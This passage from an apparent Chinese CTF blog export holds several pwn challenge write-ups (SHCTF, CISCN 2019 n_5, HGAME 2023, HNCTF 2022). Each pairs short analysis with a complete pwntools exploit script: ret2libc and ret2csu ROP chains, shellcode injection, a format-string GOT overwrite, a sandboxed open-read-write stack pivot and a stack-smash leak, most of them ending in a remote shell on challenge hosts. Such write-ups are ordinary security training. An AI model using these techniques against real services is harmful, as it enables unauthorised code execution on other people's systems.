class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">   srand = libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">   x = libc.rand()</span><br><span class="line">   y = (x+<span class="number">1919810</span>)^<span class="number">114514</span></span><br><span class="line">   sl(<span class="built_in">str</span>(y))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line">   v1 = <span class="number">2147483647</span>+<span class="number">200</span></span><br><span class="line">   v2 = v1 - <span class="number">100</span></span><br><span class="line">   sla(<span class="string">&quot;v1:\n&quot;</span>, <span class="built_in">str</span>(v1))</span><br><span class="line">   sla(<span class="string">&quot;v2:\n&quot;</span>, <span class="built_in">str</span>(v2))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test3</span>():</span><br><span class="line">   libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">   offset = <span class="number">6</span></span><br><span class="line">   payload1 = <span class="string">b&#x27;%15$p&#x27;</span></span><br><span class="line">   sla(<span class="string">b&#x27;gift\n&#x27;</span>, payload1)</span><br><span class="line">   write_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(),<span class="number">16</span>)-<span class="number">23</span></span><br><span class="line">   libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">   su(<span class="string">&quot;libc_base:&quot;</span>,libc_base)</span><br><span class="line">   system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">   su(<span class="string">&quot;system:&quot;</span>,system)</span><br><span class="line">   system1 = (system &amp; <span class="number">0xffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">   system2 = (system&amp;<span class="number">0xffff</span>)</span><br><span class="line">   su(<span class="string">&quot;system1:&quot;</span>,system1)</span><br><span class="line">   su(<span class="string">&quot;system2:&quot;</span>,system2)</span><br><span class="line">   payload2 = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(system1).encode()+<span class="string">b&#x27;c%10$hhn&#x27;</span></span><br><span class="line">   payload2 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(system2-system1).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="built_in">len</span>(payload2))</span><br><span class="line">   payload2 += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">   payload2 += p64(elf.got[<span class="string">&#x27;printf&#x27;</span>]+<span class="number">2</span>) + p64(elf.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">   sl(payload2)</span><br><span class="line">   sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">test1()</span><br><span class="line">test2()</span><br><span class="line">test3()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="start-your-pwn">Start Your PWN!</span></h2><ol>
<li><code>read</code> 函数可溢出；</li>
<li>IDA 可见 <code>__libc_csu_init</code> 可用；</li>
<li><code>write</code> 执行后泄露真实地址以获取 libc 版本；</li>
<li>IDA 获取 <code>write</code> 和 <code>main</code> 地址；</li>
<li>使用 <code>ropgadget</code> 获取可用片段。</li>
</ol>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;112.6.51.212&#x27;</span>,<span class="number">30082</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = <span class="number">0x601018</span></span><br><span class="line">main_addr = <span class="number">0x400699</span></span><br><span class="line">pop_addr = <span class="number">0x40076A</span></span><br><span class="line">mov_addr = <span class="number">0x400750</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400773</span></span><br><span class="line">ret = <span class="number">0x400506</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(mov_addr) + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结</span></h1><p>做得不太知所措，云里雾里，还需继续加油！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>SHCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[CISCN 2019华北] PWN5（ciscn_2019_n_5） 复现</title>
    <url>/%5BCISCN%202019%E5%8D%8E%E5%8C%97%5D%20PWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[CISCN 2019华北] PWN5（ciscn_2019_n_5）复现</p>
<span id="more"></span>

<h1><span id="ciscn_2019_n_5">ciscn_2019_n_5</span></h1><p>老套路，首先 checksec 一下文件，保护机制全关（这个时候就要想到可以直接 shellcode）。</p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>然后 IDA 一下看看伪代码，可以发现一个在 <code>.bss</code> 段上面的 <code>name</code>，并且在该代码段为可读可写可执行的权限，也很容易看出来 <code>gets</code> 造成了溢出，下面就开始对症下药：</p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/2.png"></p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/3.png"></p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/4.png"></p>
<hr>
<h2><span id="法一">法一:</span></h2><p>直接在 <code>.bss</code> 段 <code>name</code> 上面直接构造 shellcode（因为该文件未开启 NX 保护机制，并且该代码段权限全开），然后直接溢出就可以得到 shell。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28499</span>)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;tell me your name\n&#x27;</span>, shellcode)</span><br><span class="line"> </span><br><span class="line">name = <span class="number">0x601080</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(name)</span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="法二无-libc-版本文件">法二:(无 libc 版本文件)</span></h2><p>可以直接看成是 ret2libc，直接泄露 libc，构造 rop 链来获得 shell。因为这题有一个在 <code>.bss</code> 段上面的 <code>name</code>，所以可以直接把 <code>/bin/sh</code> 写到 <code>name</code> 里面，最后直接执行就能获得 shell。</p>
<p><img src="/images/%5BCISCN2019%E5%8D%8E%E5%8C%97%5DPWN5%EF%BC%88ciscn_2019_n_5%EF%BC%89%E5%A4%8D%E7%8E%B0/5.png"></p>
<p>EXP 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28499</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4006a9&#x27;)</span></span><br><span class="line">plt_addr = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400636</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span></span><br><span class="line">rdi_addr = <span class="number">0x400713</span></span><br><span class="line">name_addr = <span class="number">0x601080</span></span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>, payload)</span><br><span class="line"> </span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(name_addr) + p64(system)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="法三有-libc-版本文件">法三:(有 libc 版本文件)</span></h2><p>此题为 Ubuntu 18（64 位），可在 BUU 上面直接找到相对应的 libc 版本。构造的时候有些地方与无 libc 版本的不同，需要注意。</p>
<p>EXP 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python复制编辑<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28158</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x4006a9&#x27;)</span></span><br><span class="line">plt_addr = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">got_addr = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400636</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span></span><br><span class="line">rdi_addr = <span class="number">0x400713</span></span><br><span class="line">name_addr = <span class="number">0x601080</span></span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(rdi_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>, payload)</span><br><span class="line"> </span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">b&#x27;name\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> + <span class="number">8</span>) + p64(ret_addr) + p64(rdi_addr) + p64(name_addr) + p64(system)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;me?\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1><span id="总结">总结</span></h1><p>此题我认为需要认真分析伪代码，发现其漏洞和一些重要信息，并且需要了解怎么构造 shellcode 和构造 rop 执行流，这些都是比较基础的知识点。</p>
<p>最后法二和法三构造 EXP 有些不同点，可以尝试对比一下，你应该会收获不少（上述为个人看法，如有不对，希望各位师傅指正）。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>[HGAME 2023 week1] PWN 复现</title>
    <url>/%5BHGAME%202023%20week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[HGAME 2023 week1] PWN 复现</p>
<span id="more"></span>

<h2><span id="test_nc">test_nc</span></h2><p>签到题：</p>
<blockquote>
<p>nc 一下</p>
<p>cat flag</p>
</blockquote>
<hr>
<h2><span id="easy_overflow">easy_overflow</span></h2><p>经典的栈溢出，但需要注意 <code>close(1)</code> 关闭了标准输出流，因此需先打开才能拿到 shell。EXP 如下</p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/1.png"></p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28203</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x40117E</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x10</span> +<span class="number">8</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="simple_shellcode">simple_shellcode</span></h2><p>首先ida一下，可以很明显的了解到跟沙盒有关，再查一下沙盒机制，显然不能直接构造orw，再加上read所存储的字节数少，不能直接构造，所以可以在mmap上面来构造orw</p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/3.png"></p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/4.png"></p>
<p>mmap函数解析：</p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/5.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28291</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./shellcode&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;shellcode:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">mmap_addr = <span class="number">0xcafe0000</span></span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, mmap_addr+<span class="number">0x100</span>, <span class="number">0x50</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">p.send(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(<span class="string">&quot;xor rdi,rdi;mov rsi,0xcafe000f;syscall;&quot;</span>)))</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="orw">orw</span></h2><p>先ida一下，可以看出来需要进行栈迁移，并且还存在沙盒，还有一段0x30的空间（溢出的空间较大），这就是为什么exp和[NSSCTF Round#14 Basic] rbp 不一样的原因，可溢出的空间不同，导致所利用的条件不同</p>
<p><img src="/images/%5BHGAME2023week1%5DPWN%E5%A4%8D%E7%8E%B0/6.png"></p>
<p>先泄露libc，再把orw写在自己确定的bss段，再用 leave ret 转到bss段，执行orw</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28392</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret     = <span class="number">0x401393</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x401391</span></span><br><span class="line">bss_addr        = elf.bss(<span class="number">0x800</span>)</span><br><span class="line">puts_plt        = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got        = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">vuln_addr       = <span class="number">0x4012c0</span></span><br><span class="line">leave_ret       = <span class="number">0x4012be</span></span><br><span class="line">read            = <span class="number">0x4012CF</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;task.\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">open_addr  = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr  = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x2601f</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x142c92</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>) + p64(bss_addr+<span class="number">0x100</span>) + p64(read)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(bss_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(bss_addr+<span class="number">0x200</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x50</span>) + p64(write_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="choose_the_seat">choose_the_seat</span></h2><p>该题存在数组越界导致的 GOT overwrite 利用流程，利用负数越界和 one‑gadget 获取 shell，这题有点难，不太会写，此题存在数组越界（下次懂了再来）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./choose&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28620</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">main_addr = <span class="number">0x4011d6</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(main_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-8&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">one_gadget  = libc_base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;one.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;-6&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.send(p64(one_gadget))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>[HNCTF 2022 WEEK3] smash 复现</title>
    <url>/%5BHNCTF%202022%20WEEK3%5D%20smash%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[HNCTF 2022 WEEK3] smash 复现</p>
<span id="more"></span>

<h1><span id="smash">smash</span></h1><p>查看保护机制，正如题目的名字 smash（所以会涉及到花式栈溢出 stack smash），打开了 NX 和 canary</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/1.png"></p>
<p>IDA 一下，发现 gets 函数造成了溢出，并且 flag 存在 buf 里面</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/2.png"></p>
<p>接下来我们就需要了解一下 stack smash<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash">（花式栈溢出技巧 - CTF Wiki (ctf-wiki.org)）</a></p>
<blockquote>
<h2><span id="stack-smash">Stack smash</span></h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p>
</blockquote>
<p>当我们了解了 Stack smash 后，我们就可以溢出到 arg[0]，然后将该指针改成 buf 就能获得 flag，下面就开始求偏移。</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/3.png"></p>
<p>两个地址相减就可得偏移 0x208（但是正确的偏移是 0x1f8，比正确的偏移多了 0x10，问了下学长可能是版本的问题，方法会了就行，小问题不伤大雅）</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/4.png"></p>
<p>也可以这样算</p>
<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
<h2><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(’./pwn’)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1><span id="总结">总结：</span></h1><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HNCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[HNCTF 2022 Week1] PWN 复现</title>
    <url>/%5BHNCTF%202022%20Week1%5D%20PWN%20%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>[HNCTF 2022 Week1] PWN 复现</p>
<span id="more"></span>

<h2><span id="easync">easync</span></h2><p>签到题，直接 <code>nc</code> 就行，但是这里有坑需要注意下，直接 <code>cat flag</code>，得到的是一个假的 flag，真的 flag 分为两部分，这点需要注意下。</p>
<hr>
<h2><span id="easyoverflow">easyoverflow</span></h2><p>简单的栈溢出，直接溢出就行，exp 如下：</p>
